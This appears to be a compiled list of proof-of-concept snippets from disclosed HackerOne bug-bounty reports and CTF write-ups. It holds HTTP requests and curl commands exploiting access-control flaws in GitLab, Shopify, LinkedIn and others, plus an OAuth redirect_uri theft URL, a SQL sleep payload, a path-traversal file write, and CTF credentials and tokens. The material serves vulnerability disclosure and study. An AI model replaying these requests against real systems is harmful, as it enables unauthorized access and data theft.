## 221. [#1751258](https://hackerone.com/reports/1751258)  -  Attacker is able to create,Edit & delete notes and leak the title of a victim's private personal snippet
*medium, $1,730*

```http
PUT /attacker/privateattackerproject/notes/8 HTTP/2
Host: gitlab-pentest2.example.com

{"target_type":"issue","target_id":7,"note":{"note":"test2"}}
```

## 222. [#1751258](https://hackerone.com/reports/1751258)  -  Attacker is able to create,Edit & delete notes and leak the title of a victim's private personal snippet
*medium, $1,730*

```http
PUT /attacker/privateattackerproject/notes/8 HTTP/2
Host: gitlab-pentest2.example.com

{"target_type":"personal_snippet","target_id":3,"note":{"note":"test2"}}
```

## 223. [#1751258](https://hackerone.com/reports/1751258)  -  Attacker is able to create,Edit & delete notes and leak the title of a victim's private personal snippet
*medium, $1,730*

```http
DELETE /attacker/privateattackerproject/notes/8 HTTP/2
Host: gitlab-pentest2.example.com
```

## 224. [#1751258](https://hackerone.com/reports/1751258)  -  Attacker is able to create,Edit & delete notes and leak the title of a victim's private personal snippet
*medium, $1,730*

```http
DELETE /attacker/privateattackerproject/notes/7 HTTP/2
Host: gitlab-pentest2.example.com
```

## 225. [#1751258](https://hackerone.com/reports/1751258)  -  Attacker is able to create,Edit & delete notes and leak the title of a victim's private personal snippet
*medium, $1,730*

```http
PUT /attacker/privateattackerproject/notes/8 HTTP/2
Host: gitlab-pentest2.example.com
```

## 226. [#497047](https://hackerone.com/reports/497047)  -  Blocked user Git access through CI/CD token
*medium, $1,500*

```http
GET /testuser1/block_poc.git/info/refs?service=git-upload-pack HTTP/1.1
Host: 192.168.0.16
Authorization: Basic Z2l0bGFiLWNpLXRva2VuOlVwbnllR2plRlo4cV95UnptV1Fx
```

## 227. [#853130](https://hackerone.com/reports/853130)  -  IDOR on stocky application-Low Stock-Varient-Settings-Columns
*medium, $750*

```http
POST /settings_for_low_stock_variants/111112 HTTP/1.1
```

## 228. [#1021776](https://hackerone.com/reports/1021776)  -  Attacker can generate cancelled transctions in a user's transaction history using only Steam ID
*medium, $300*

```http
POST https://cs.money/create-payment HTTP/1.1
Host: cs.money
Content-Type: application/json;charset=UTF-8
Cookie: steamid=████████; 

{"merchant":"cardpay","amount":10}
```

## 229. [#1727044](https://hackerone.com/reports/1727044)  -  Email Address Exposure via Gratipay Migration Tool
*medium, $100*

```http
POST /migrate?step=2 HTTP/1.1
Host: liberapay.com
Cookie: XXXXXXX
X-CSRF-TOKEN: XXXXXXX
Content-Type: application/x-www-form-urlencoded

email_address=suprnova+gratipay@wearehackerone.com&username=suprnova
```

## 230. [#1257428](https://hackerone.com/reports/1257428)  -  Create free Shopify application credits.
*medium*

```http
POST /admin/api/2021-07/graphql HTTP/2
Host: shopify-graphiql-app.shopifycloud.com
Cookie: _shopify_graphiql_app=RJlzS4n3qPHR0fClrTa1
X-Csrf-Token: FS1j+3c4nU

{"query":"{\n  shop {\n    name\n  }\n}\n","variables":null,"operationName":null}
```

## 231. [#1987011](https://hackerone.com/reports/1987011)  -  [Hubs] - Broken access control in placing objects in hubs room
*medium*

```javascript
dispatchCommand = async (command, ...args) => {
    const entered = this.scene.is("entered");
    uiRoot = uiRoot || document.getElementById("ui-root");
    const isGhost = !entered && uiRoot && uiRoot.firstChild && uiRoot.firstChild.classList.contains("isGhost");

    // TODO: Some of the commands below should be available without requiring room entry.
    if (!entered && (!isGhost || command === "duck")) {
      this.log(LogMessageType.roomEntryRequired);
      return;
    }
```

## 232. [#1608735](https://hackerone.com/reports/1608735)  -  IDOR allows an attacker to delete anyone's featured photo.
*medium*

```http
DELETE /voyager/api/voyagerIdentityDashProfileTreasuryMedia/urn:li:fsd_profileTreasuryMedia:(█████████,███████)?sectionUrn=urn:li:fsd_profile:███████
```

## 233. [#2040756](https://hackerone.com/reports/2040756)  -  An attacker can submit a Pentest Opportunity and change the status of the opportunity from submitted to in_review or reviewed
*medium*

```http
POST /graphql HTTP/1.1
Host: hackerone.com
Cookie: <COOKIES>
Referer: https://hackerone.com/opportunities/all
Content-Type: application/json
X-Csrf-Token: <CSRF-TOKEN>
Content-Type: application/json
```

## 234. [#3114554](https://hackerone.com/reports/3114554)  -  Privilege Persistence via Cloned Agent
*medium*

```http
PATCH /api/w/BSsJ1zPUYE/assistant/agent_configurations/gemini-pro
```

## 235. [#2140960](https://hackerone.com/reports/2140960)  -  Ability to see hidden likes
*medium*

```http
GET /i/api/graphql/lVf2NuhLoYVrpN4nO7uw0Q/Likes?variables=%7B%22userId%22%3A%22██████████%22%2C%22count%22%3A20%2C%22includePromotedContent%22%3Afalse%2C%22withClientEventToken%22%3Afalse%2C%22withBirdwatchNotes%22%3Afalse%2C%22withVoice%22%3Atrue%2C%22withV2Timeline%22%3Afalse%7D&features=%7B%22responsive_web_graphql_exclude_directive_enabled%22%3Atrue%2C%22verified_phone_label_enabled%22%3Afalse%2C%22creator_subscriptions_tweet_preview_api_enabled%22%3Atrue%2C%22responsive_web_graphql_timeline_navigation_enabled%22%3Atrue%2C%22responsive_web_graphql_skip_user_profile_image_extensions_enabled%22%3Afalse%2C%22tweetypie_unmention_optimization_enabled%22%3Atrue%2C%22responsive_web_edit_tweet_api_enabled%22%3Atrue%2C%22graphql_is_translatable_rweb_tweet_is_translatable_enabled%22%3Atrue%2C%22view_counts_everywhere_api_enabled%22%3Atrue%2C%22longform_notetweets_consumption_enabled%22%3Atrue%2C%22responsive_web_twitter_article_tweet_consumption_enabled%22%3Afalse%2C%22tweet_awards_web_tipping_enabled%22%3Afalse%2C%22freedom_of_speech_not_reach_fetch_enabled%22%3Atrue%2C%22standardized_nudges_misinfo%22%3Atrue%2C%22tweet_with_visibility_results_prefer_gql_limited_actions_policy_enabled%22%3Atrue%2C%22longform_notetweets_rich_text_read_enabled%22%3Atrue%2C%22longform_notetweets_inline_media_enabled%22%3Atrue%2C%22responsive_web_media_download_video_enabled%22%3Afalse%2C%22responsive_web_enhance_cards_enabled%22%3Afalse%7D HTTP/2
Host: twitter.com
Cookie: 
Referer: https://twitter.com/██████/likes
Content-Type: application/json
X-Csrf-Token:
# … truncated …
```

## 236. [#717716](https://hackerone.com/reports/717716)  -  Any user with access to program can resume and suspend HackerOne Gateway
*medium*

```http
POST /graphql? HTTP/1.1
Host: hackerone.com

{"query":"mutation updateState($input_0:UpdateGatewayProgramStateInput!) {updateGatewayProgramState(input:$input_0) { team { handle } } }","variables":{"input_0":{"team_id":"Z2lkOi8vaGFja2Vyb25lL1RlYW0vMTM=","vpn_suspended":false,"clientMutationId":"0"}}}
```

## 237. [#717716](https://hackerone.com/reports/717716)  -  Any user with access to program can resume and suspend HackerOne Gateway
*medium*

```http
POST /graphql? HTTP/1.1
Host: hackerone.com
```

## 238. [#1644436](https://hackerone.com/reports/1644436)  -  IDOR in Stats API Endpoint Allows Viewing Equity or Net Profit of Any MT Account
*medium*

```http
GET /v3/personal_area/stats/equity?time_range=365&accounts=xxx HTTP/2
Host: my.exness.com
Authorization: Bearer xyz
Content-Type: application/json
```

## 239. [#1592587](https://hackerone.com/reports/1592587)  -  IDOR - Delete technical skill assessment result & Gained Badges result of any user
*medium*

```http
DELETE /voyager/api/voyagerAssessmentsDashSkillAssessmentAttemptReports/urn%3Ali%3Afsd_skillAssessmentAttemptReport%3A(urn%3Ali%3Afsd_profile%███████%2Curn%3Ali%3Askill%3A280%2C1) HTTP/2
Host: www.linkedin.com
```

## 240. [#909863](https://hackerone.com/reports/909863)  -  Low privileged user can create high privileged user's KITCRM authorization token and can read and write message to KIT
*medium*

```http
GET /api/v2/messages HTTP/1.1
Host: www.kitcrm.com
Content-Type: application/json
Cookie: 
Authorization: Bearer ████████
```

## 241. [#1372216](https://hackerone.com/reports/1372216)  -  IDOR in "external status check" API leaks data about any status check on the instance
*medium*

```http
POST /projects/:id/merge_requests/:merge_request_iid/status_check_responses
```

## 242. [#1085042](https://hackerone.com/reports/1085042)  -  [h1-2102] Improper Access Control at https://shopify.plus/[id]/users/api in operation UpdateOrganizationUserTfaEnforcement
*medium*

```http
POST /34808573/users/api HTTP/1.1
Host: shopify.plus

{
        "operationName": "UpdateOrganizationUserTfaEnforcement",
        "variables": {
            "id": "Z2lkOi8vb3JnYW5pemF0aW9uL09yZ2FuaXphdGlvblVzZXIvMzQwNTc5Mzg=",
            "enforced": false
        },
        "query": "mutation UpdateOrganizationUserTfaEnforcement($id: OrganizationUserID!, $enforced: Boolean!) {\n  updateOrganizationUserTfaEnforcement(id: $id, enforced: $enforced) {\n    organizationUser {\n      id\n      tfaEnforced\n      __typename\n    }\n    userErrors {\n      field\n      message\n      __typename\n    }\n    operationStatus\n    message\n    __typename\n  }\n}\n"
    }
```

## 243. [#1085042](https://hackerone.com/reports/1085042)  -  [h1-2102] Improper Access Control at https://shopify.plus/[id]/users/api in operation UpdateOrganizationUserTfaEnforcement
*medium*

```http
POST /34808573/users/api HTTP/1.1
Host: shopify.plus
```

## 244. [#1084638](https://hackerone.com/reports/1084638)  -  [h1-2102] Improper Access Control at https://shopify.plus/[id]/users/api in operation UpdateOrganizationUserRole
*medium*

```http
POST /34808573/users/api HTTP/1.1
Host: shopify.plus

{"operationName":"UpdateOrganizationUserRole","variables":{"id":"Z2lkOi8vb3JnYW5pemF0aW9uL09yZ2FuaXphdGlvblVzZXIvMzQwNzE2MzI=","roleId":"Z2lkOi8vb3JnYW5pemF0aW9uL1JvbGUvNjYxAAA="},"query":"mutation UpdateOrganizationUserRole($id: OrganizationUserID!, $roleId: RoleID!) {\n  updateOrganizationUserRole(id: $id, roleId: $roleId) {\n    organizationUser {\n      id\n      status\n      role {\n        id\n        name\n        __typename\n      }\n      propertyAccess {\n        shops {\n          edges {\n            node {\n              shopUserId\n              status\n              __typename\n            }\n            __typename\n          }\n          __typename\n        }\n        apps {\n          edges {\n            node {\n              status\n              __typename\n            }\n            __typename\n          }\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    userErrors {\n      field\n      message\n      __typename\n    }\n    message\n    operationStatus\n    __typename\n  }\n}\n"}
```

## 245. [#1587374](https://hackerone.com/reports/1587374)  -  Campaign Account Balance and History Disclosed in API Response
*medium*

```http
GET /campaign-manager-api/campaignManagerAccounts/█████████████/accountCredits?q=account HTTP/2
Host: www.linkedin.com
```

## 246. [#1084939](https://hackerone.com/reports/1084939)  -  [h1-2102] [PLUS] User with Store Management Permission can Make enforceSamlOrganizationDomains call - that should be limited to User Management Only
*medium*

```http
POST /34946971/stores/api HTTP/1.1
Host: shopify.plus

{"query":"query{organization{domains{id}}}"}
```

## 247. [#1084939](https://hackerone.com/reports/1084939)  -  [h1-2102] [PLUS] User with Store Management Permission can Make enforceSamlOrganizationDomains call - that should be limited to User Management Only
*medium*

```http
POST https://shopify.plus/34946971/stores/api

{"query":"mutation  {\n  enforceSamlOrganizationDomains(domainIds:[\"REPLACE_ME\"]) {\n   userErrors{message} }}\n"}
```

## 248. [#1084939](https://hackerone.com/reports/1084939)  -  [h1-2102] [PLUS] User with Store Management Permission can Make enforceSamlOrganizationDomains call - that should be limited to User Management Only
*medium*

```http
POST /34946971/stores/api HTTP/1.1
Host: shopify.plus
```

## 249. [#1084939](https://hackerone.com/reports/1084939)  -  [h1-2102] [PLUS] User with Store Management Permission can Make enforceSamlOrganizationDomains call - that should be limited to User Management Only
*medium*

```http
POST https://shopify.plus/34946971/stores/api
```

## 250. [#867052](https://hackerone.com/reports/867052)  -  Access Control: Inject tasks into other users decks
*medium*

```http
POST /apps/deck/cards HTTP/1.1

{"title":"SOME_TEST","stackId":1,"type":"plain"}
```

## 251. [#867052](https://hackerone.com/reports/867052)  -  Access Control: Inject tasks into other users decks
*medium*

```http
PUT /apps/deck/cards/13 HTTP/1.1

{"title":"SOME_TEST","description":"","stackId":2,"type":"plain","lastModified":1588755341,"lastEditor":null,"createdAt":1588755341,"labels":null,"assignedUsers":null,"attachments":null,"attachmentCount":null,"owner":"test1","order":999,"archived":false,"duedate":null,"deletedAt":0,"commentsUnread":0,"id":13,"overdue":0}
```

## 252. [#867052](https://hackerone.com/reports/867052)  -  Access Control: Inject tasks into other users decks
*medium*

```http
POST /apps/deck/cards HTTP/1.1
```

## 253. [#867052](https://hackerone.com/reports/867052)  -  Access Control: Inject tasks into other users decks
*medium*

```http
PUT /apps/deck/cards/13 HTTP/1.1
```

## 254. [#633371](https://hackerone.com/reports/633371)  -  Add store to new partner account without confirming email address.
*medium*

```http
GET /1234/stores/signup_object/dev_store 
Host: partners.shopify.com
```

## 255. [#633371](https://hackerone.com/reports/633371)  -  Add store to new partner account without confirming email address.
*medium*

```http
POST /services/signup/create HTTP/1.1
Host: app.shopify.com
```

## 256. [#2312029](https://hackerone.com/reports/2312029)  -  View Titles of Private Reports with pending email invitation
*high*

```js
const csrf_token = document.getElementsByName("csrf-token")[0].getAttribute("content")
const REPORT_ID = PRIVATE_REPORT_ID // integer

var resp = await(await fetch("https://hackerone.com/graphql", {
  "headers": {
    "accept": "*/*",
    "content-type": "application/json",
    "x-csrf-token": csrf_token,
  },
  "body": JSON.stringify({
    "operationName": "HacktivitySearchQuery",
    "variables": {
        "reportId": REPORT_ID
    },
    "query": `query HacktivitySearchQuery($reportId: Int!) {
  report(id: $reportId){
    id
    url
    title
  }
}
`
}),
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
})).json()
console.log(resp.data.report)
```

## 257. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```bash
$ ./gitdumper.sh https://app.bountypay.h1ctf.com/.git/ ./output/
```

## 258. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```bash
$ ./d2j-dex2jar.sh -f -o ./../h1-ctf/jar/BountyPay.jar ./../h1-ctf/BountyPay.apk
```

## 259. [#3371448](https://hackerone.com/reports/3371448)  -  Improper Authorization Leads to Editor can toggle admin-only workspace features (Lovable AI)
*low*

```http
POST /workspaces/<WORKSPACE_ID>/tool-preferences/ai_gateway/enable HTTP/2
Host: lovable-api.com
Authorization: Bearer <OWNER-TOKEN>
Content-Type: application/json

{"approval_preference":"disable"}
```

## 260. [#3371448](https://hackerone.com/reports/3371448)  -  Improper Authorization Leads to Editor can toggle admin-only workspace features (Lovable AI)
*low*

```http
POST /workspaces/<WORKSPACE_ID>/tool-preferences/ai_gateway/enable HTTP/2
Host: lovable-api.com
Authorization: Bearer <EDITOR_JWT>
Content-Type: application/json

{"approval_preference":"disable"}
```

## 261. [#3371448](https://hackerone.com/reports/3371448)  -  Improper Authorization Leads to Editor can toggle admin-only workspace features (Lovable AI)
*low*

```http
POST /workspaces/<WORKSPACE_ID>/tool-preferences/ai_gateway/enable HTTP/2
Host: lovable-api.com
Authorization: Bearer <OWNER-TOKEN>
Content-Type: application/json
```

## 262. [#510759](https://hackerone.com/reports/510759)  -  IDOR in Report CSV export discloses the IDs of Custom Field Attributes of Programs
*low*

```http
POST /reports/export HTTP/1.1
Host: localhost:8080
```

## 263. [#3371414](https://hackerone.com/reports/3371414)  -  Improper Authorization Leads to Editor can toggle admin-only workspace features (Lovable Cloud)
*low*

```http
POST /workspaces/<WORKSPACE_ID>/tool-preferences/supabase/enable HTTP/2
Host: lovable-api.com
Authorization: Bearer <OWNER-JWT>
Content-Type: application/json

{"approval_preference":"disable"}
```

## 264. [#3371414](https://hackerone.com/reports/3371414)  -  Improper Authorization Leads to Editor can toggle admin-only workspace features (Lovable Cloud)
*low*

```http
POST /workspaces/<WORKSPACE_ID>/tool-preferences/supabase/enable HTTP/2
Host: lovable-api.com
Authorization: Bearer <EDITOR_JWT>
Content-Type: application/json

{"approval_preference":"disable"}
```

## 265. [#3371414](https://hackerone.com/reports/3371414)  -  Improper Authorization Leads to Editor can toggle admin-only workspace features (Lovable Cloud)
*low*

```http
POST /workspaces/<WORKSPACE_ID>/tool-preferences/supabase/enable HTTP/2
Host: lovable-api.com
Authorization: Bearer <OWNER-JWT>
Content-Type: application/json
```

## 266. [#3369843](https://hackerone.com/reports/3369843)  -  Low-privileged user can enable or disable Lovable AI for new projects in workspace
*low*

```http
DELETE /workspaces/<workspace_id>/tool-preferences/ai_gateway/enable

<!-- To disable -->
```

## 267. [#3369843](https://hackerone.com/reports/3369843)  -  Low-privileged user can enable or disable Lovable AI for new projects in workspace
*low*

```http
POST /workspaces/<workspace_id>/tool-preferences/ai_gateway/enable
```

## 268. [#2967634](https://hackerone.com/reports/2967634)  -  Exposed proxy allows to access internal reddit domains
*high, $7,500*

```bash
curl --insecure https://52.90.28.77:30920/reddit --header "Host: █████████"
```

## 269. [#1861974](https://hackerone.com/reports/1861974)  -  Stealing Users OAuth authorization code via redirect_uri
*high, $2,000*

```
redirect_uri=https%3A%2F%2Fbooth.pm%2Fusers%2Fauth%2Fpixiv%2Fcallback/../../../../ja/items/4503924
```

## 270. [#1861974](https://hackerone.com/reports/1861974)  -  Stealing Users OAuth authorization code via redirect_uri
*high, $2,000*

```
https://oauth.secure.pixiv.net/v2/auth/authorize?client_id=a1Z7w6JssUQkw5Hid0uIDeuesue9&redirect_uri=https%3A%2F%2Fbooth.pm%2Fusers%2Fauth%2Fpixiv%2Fcallback/../../../../ja/items/[attacker's product id]&response_type=code&scope=read-works+read-favorite-users+read-friends+read-profile+read-email+write-profile&state=%3A1a38b53563599621ce25094661b1c4458ddb52d79d771149
```

## 271. [#1194606](https://hackerone.com/reports/1194606)  -  Virtual Data Room / Hide download on collabora is easy to bypass
*high, $150*

```bash
curl https://server/index.php/apps/richdocument/wopi/files/1234_abcd?access_token=efgh -o stolen.odt
```

## 272. [#1098793](https://hackerone.com/reports/1098793)  -  Kroki Arbitrary File Read/Write
*high*

```json
[#goals]
:imagesdir: diag-58f90331904a1989259d639c5677e0fff5e434e739c70f1d3bb2004723bc99b8.
:outdir: /tmp/

[plantuml, test="{counter:kroki-fetch-diagram:true}",tet="{counter:kroki-server-url:http://192.168.69.1:8082/}", format="/../../../../../../tmp/test_file_write.txt"]
....
class BlockProcessor
class DiagramBlock
class DitaaBlock
class PlantUmlBlock

BlockProcessor <|-- hehe
DiagramBlock <|-- DitaaBlock
DiagramBlock <|-- PlantUmlBlock
....
```

## 273. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```html
<script src="/js/jquery.min.js"></script>
```

## 274. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```html
<script src="/js/bootstrap.min.js"></script>
```

## 275. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```html
<script>
    var url = 'Lz90ZW1wbGF0ZVtdPXRpY2tldCZ0aWNrZXRfaWQ9MzU4MiZ0ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29u';
</script>
```

## 276. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```html
<script src="/js/website.js"></script>
```

## 277. [#1067912](https://hackerone.com/reports/1067912)  -  A Visit from The Grinch ~ 'Twas the night before Hackmas...
*critical*

```html
<script src="/assets/js/jquery.min.js"></script>
```

## 278. [#1724016](https://hackerone.com/reports/1724016)  -  Download permissions can be changed by resharer
*medium, $500*

```bash
curl -u user2:pass 'https://SERVER/ocs/v2.php/apps/files_sharing/api/v1/shares/11' -X PUT -H "OCS-APIREQUEST: true" -H 'Content-Type: application/json' --data-raw '{"permissions":"17","attributes":"[{\"scope\":\"permissions\",\"key\":\"download\",\"enabled\":true}]"}'
```

## 279. [#2965723](https://hackerone.com/reports/2965723)  -  Ability to access policy and updates for unauthorized program
*medium*

```bash
curl "https://api.hackerone.com/v1/hackers/programs/askcmsakmdfksqa_h1b/" \
     -X GET \
     -u "██████=" \
     -H 'Accept: application/json'
```

## 280. [#1011767](https://hackerone.com/reports/1011767)  -  X-Forward-For Header allows to bypass access restrictions
*medium*

```
➜  /tmp curl -k https://biz-app.yelp.com/status                                

{"error": {"id": "PredicateMismatch"}}%                                                                                                                                   
➜  /tmp curl -k https://biz-app.yelp.com/status -H "X-Forwarded-For: 127.0.0.1"

{"host": "biz--app-main--useast1-74dd77b89b-fgtdk", "health": {}, "mem_vsz": 1111.61328125, "mem_rss": 410.0, "pid": 91941, "uptime": 178784.86051034927, "version": null}
```

## 281. [#1011767](https://hackerone.com/reports/1011767)  -  X-Forward-For Header allows to bypass access restrictions
*medium*

```
➜  /tmp curl -k https://biz-app.yelp.com/swagger.json                                                                                                                                                                
{"error": {"id": "HTTPNotFound"}}%                                                                                                                                                                                   
➜  /tmp curl -k https://biz-app.yelp.com/swagger.json -H "X-Forwarded-For: 127.0.0.1"                                                                                                                                                                                                                                                                                                                            
█████
█████
███████
█████████
████
███
████
██████
█████████ 
██████████ [...]
```

## 282. [#614355](https://hackerone.com/reports/614355)  -  GraphQL query "namespace" leaks data
*medium*

```bash
curl --header "PRIVATE-TOKEN: anotherUserToken" 'https://gitlab.com/api/v4/namespaces/16048'
{"message":"404 Namespace Not Found"}
```

## 283. [#614355](https://hackerone.com/reports/614355)  -  GraphQL query "namespace" leaks data
*medium*

```bash
curl 'https://gitlab.com/api/graphql' -H 'Content-Type: application/json' --data '{"query":"{namespace(fullPath:\"rpadovani\") {description\n requestAccessEnabled\n fullName\n fullPath\n id\n lfsEnabled\n name\n path\n visibility\n projects (includeSubgroups: true, ) {edges {node {id\n name\n archived\n visibility\n description}}}}}","variables":null,"operationName":null}'
```

## 284. [#614355](https://hackerone.com/reports/614355)  -  GraphQL query "namespace" leaks data
*medium*

```bash
curl 'https://gitlab.com/api/graphql' -H 'Content-Type: application/json' --data '{"query":"{namespace(fullPath:\"secret-group-213\") {description\n requestAccessEnabled\n fullName\n fullPath\n id\n lfsEnabled\n name\n path\n visibility\n projects (includeSubgroups: true, ) {edges {node {id\n name\n archived\n visibility\n description}}}}}","variables":null,"operationName":null}'
```

## 285. [#1285226](https://hackerone.com/reports/1285226)  -  Improper access control for users with expired password, giving the user full access through API and Git
*medium*

```bash
curl --request GET \
  --url https://gitlab.domain.com/api/v4/projects/:ID \
  --header 'Authorization: Bearer <TOKEN>' \
```

## 286. [#1192460](https://hackerone.com/reports/1192460)  -  A deactivated user can access data through GraphQL
*medium*

```bash
curl 'https://gitlab.com/api/graphql' -H 'Accept: application/json' -H 'Content-Type: application/json' -H 'Authorization: Bearer <<TOKEN>>' --data '{"query":"{\n  currentUser{id}\n}"}'d
```

## 287. [#1192460](https://hackerone.com/reports/1192460)  -  A deactivated user can access data through GraphQL
*medium*

```bash
curl 'https://gitlab.domain.com/api/graphql' -H 'Content-Type: application/json' -H 'Accept: application/json' -H 'Authorization: Bearer <<DEACTIVATEDTOKEN>>' --data '{"query":"mutation {\n  labelCreate(input:{title:\"deactivated\", projectPath:\"test1/test1\"}){\n    errors\n    label{\n      id\n    }\n  }\n}"}'
```

## 288. [#1192460](https://hackerone.com/reports/1192460)  -  A deactivated user can access data through GraphQL
*medium*

```bash
curl 'http://gitlab.joaxcar.com/api/graphql' -H 'Accept: application/json' -H 'Content-Type: application/json' -H 'Authorization: Bearer jKSvxhuDN-Noag6N-w7R' --data '{"query":"{\n  currentUser{id}\n}"}'

{"data":{"currentUser":{"id":"gid://gitlab/User/15"}}}
```

## 289. [#447488](https://hackerone.com/reports/447488)  -  Corrupted Authorization header can cause logs not to be ingested properly in ████████
*medium*

```bash
curl -X POST -u '- A:B' https://hackerone.com/graphql\?secret\=1
```

## 290. [#1398706](https://hackerone.com/reports/1398706)  -  Google storage bucket takeover which is used to load JS file in dashboard.html in "github.com/kubernetes/release" which can lead to XSS
*medium*

```bash
curl -s https://storage.googleapis.com/k8s-artifacts-prod-vuln-dashboard/takeover.html | base64 --decode
```

## 291. [#1375393](https://hackerone.com/reports/1375393)  -  "External status checks" can be accepted by users below developer access if the user is either author or assignee of the target merge request
*medium*

```bash
curl "https://gitlab.███/api/v4/projects/<PROJECT_ID>/merge_requests/<MR_IID>/status_checks" -H "Authorization: Bearer <TOKEN>"
```

## 292. [#1375393](https://hackerone.com/reports/1375393)  -  "External status checks" can be accepted by users below developer access if the user is either author or assignee of the target merge request
*medium*

```bash
curl --request POST \
  --url 'https://gitlab.com/api/v4/projects/<PROJECT_ID>/merge_requests/<MR_IID>/status_check_responses?sha=a&external_status_check_id=<CHECK_ID>' \
  --header 'Authorization: Bearer <TOKEN>'
```

## 293. [#1375393](https://hackerone.com/reports/1375393)  -  "External status checks" can be accepted by users below developer access if the user is either author or assignee of the target merge request
*medium*

```bash
curl --request POST \
  --url 'https://gitlab.domain.com/api/v4/projects/<PROJECT_ID>/merge_requests/<MR_IID>/status_check_responses?sha=<SHA>&external_status_check_id=<CHECK_ID>' \
  --header 'Authorization: Bearer <TOKEN>'
```

## 294. [#895798](https://hackerone.com/reports/895798)  -  [H1-2006 2020] Bounty Pay CTF challenge
*critical*

```java
/* access modifiers changed from: private */
    public void getHost() {
        final SharedPreferences.Editor editor = getSharedPreferences(KEY_USERNAME, 0).edit();
        this.childRef.addListenerForSingleValueEvent(new ValueEventListener() {
            public void onDataChange(DataSnapshot dataSnapshot) {
                editor.putString("HOST", (String) dataSnapshot.getValue()).apply();
            }

            public void onCancelled(DatabaseError databaseError) {
                Log.e("TAG", "onCancelled", databaseError.toException());
            }
        });
    }

    /* access modifiers changed from: private */
    public void getToken() {
        final SharedPreferences.Editor editor = getSharedPreferences(KEY_USERNAME, 0).edit();
        this.childRefTwo.addListenerForSingleValueEvent(new ValueEventListener() {
            public void onDataChange(DataSnapshot dataSnapshot) {
                editor.putString("TOKEN", (String) dataSnapshot.getValue()).apply();
            }

            public void onCancelled(DatabaseError databaseError) {
                Log.e("TAG", "onCancelled", databaseError.toException());
            }
        });
    }
```

## 295. [#895798](https://hackerone.com/reports/895798)  -  [H1-2006 2020] Bounty Pay CTF challenge
*critical*

```sh
$ adb shell cat /data/data/bounty.pay/shared_prefs/user_created.xml 
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="PARTTWO">COMPLETE</string>
    <string name="USERNAME">0xfd</string>
    <string name="HOST">http://api.bountypay.h1ctf.com</string>
    <string name="PARTONE">COMPLETE</string>
    <string name="TWITTERHANDLE">_0xfd_</string>
    <string name="TOKEN">8e9998ee3137ca9ade8f372739f062c1</string>
</map
```

## 296. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```java
if (getIntent() != null && getIntent().getData() != null) {
  String str = getIntent().getData().getQueryParameter("start");
  if (str != null && str.equals("PartTwoActivity") && sharedPreferences.contains("USERNAME")) {
	str = sharedPreferences.getString("USERNAME", "");
	SharedPreferences.Editor editor = sharedPreferences.edit();
	String str1 = sharedPreferences.getString("TWITTERHANDLE", "");
	editor.putString("PARTONE", "COMPLETE").apply();
	logFlagFound(str, str1);
	startActivity(new Intent((Context)this, PartTwoActivity.class));
  } 
}
```

## 297. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```bash
$ adb shell
generic_x86_arm:/ $ run-as bounty.pay
generic_x86_arm:/data/data/bounty.pay $ cd shared_prefs/
generic_x86_arm:/data/data/bounty.pay/shared_prefs $ cat user_created.xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="USERNAME">nirvana_msu</string>
    <string name="PARTTWO">COMPLETE</string>
    <string name="HOST">http://api.bountypay.h1ctf.com</string>
    <string name="PARTONE">COMPLETE</string>
    <string name="TWITTERHANDLE">nirvana_msu</string>
    <string name="TOKEN">8e9998ee3137ca9ade8f372739f062c1</string>
</map>
```

## 298. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```html
<script>
	    var url = 'Lz90ZW1wbGF0ZT1ob21l';
	</script>
```

## 299. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```
+ When I decoded the base 64 id parameter, then the record was starting with the value as 2.     `eyJpZCI6Mn0=   -base64decode -  {"id":2}`. This came to my attention, the rating was starting with id value 2 and so, let's try with value 1 and check what is the record hidden inside the parameter.

+ Encoded the base64 parameter -
```

## 300. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```
+ So, there is an /forum/phpmyadmin path. I've used the `username - forum, password - 6HgeAZ0qC9T6CQIqJpD` inside phpmyadmin page and logged in successfully, I searched for the tables and finally in the table users, I got the following information:

**Request**
https://hackyholidays.h1ctf.com/forum/phpmyadmin?db=forum&table=user

**Response**

{F1139502}
```

## 301. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```
+ So, for username - grinch, password is BahHumbug. Using this credentials, logged in successfully on the page `https://hackyholidays.h1ctf.com/forum/login` and visited the secret plans forum page.

**Request**

https://hackyholidays.h1ctf.com/forum/3/2


**Response**

{F1139510}
```

## 302. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```
+ Tried payload as " or sleep(5) on name area.

**Payloads**
{F1139545}

+ After injecting, submitting the request on quiz area
```

## 303. [#1189174](https://hackerone.com/reports/1189174)  -  End to end encryption folder locking is not properly protected
*low, $250*

```bash
curl -u user1:user -X POST https://SERVER/ocs/v2.php/apps/end_to_end_encryption/api/v1/lock/332 -X POST  -H 'OCS-APIREQUEST: true' -H 'user-agent: Mozilla/5.0 (Android) Nextcloud-android/3.13.1'
```

## 304. [#769058](https://hackerone.com/reports/769058)  -  CORS misconfiguration which leads to the disclosure of certain data concerning the user.
*low*

```javascript
var invocation = new XMLHttpRequest();

  invocation.onreadystatechange = function() {
    if (invocation.readyState == XMLHttpRequest.DONE) {
      alert(invocation.response);
    }
  }

function cors(){
  if(invocation) {
